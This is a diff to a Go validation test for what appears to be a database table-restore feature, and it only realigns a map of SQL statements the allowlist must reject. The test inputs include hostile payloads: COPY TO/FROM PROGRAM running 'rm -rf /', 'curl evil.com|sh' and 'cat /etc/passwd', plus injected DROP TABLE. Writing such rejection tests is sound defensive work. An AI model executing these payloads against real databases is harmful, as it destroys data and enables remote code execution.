@@ -104,9 +104,9 @@ func TestRestoreTables_Validation(t *testing.T) {
 	// --- the disallowed-statement allowlist closes every known RCE/file vector ---
 
 	dangerous := map[string]string{
-		"TRUNCATE CASCADE":        "TRUNCATE users CASCADE;",
-		"setval trailing SQL":     "SELECT pg_catalog.setval('x', 1); DROP TABLE y;",
-		"setval subquery value":   "SELECT pg_catalog.setval('x', (SELECT max(id) FROM users));",
+		"TRUNCATE CASCADE":               "TRUNCATE users CASCADE;",
+		"setval trailing SQL":            "SELECT pg_catalog.setval('x', 1); DROP TABLE y;",
+		"setval subquery value":          "SELECT pg_catalog.setval('x', (SELECT max(id) FROM users));",
 		"COPY TO PROGRAM":                "COPY users TO PROGRAM 'rm -rf /';",
 		"COPY FROM PROGRAM":              "COPY users FROM PROGRAM 'curl evil.com|sh';",
 		"COPY FROM PROGRAM lowercase":    "copy secrets from program 'cat /etc/passwd';",
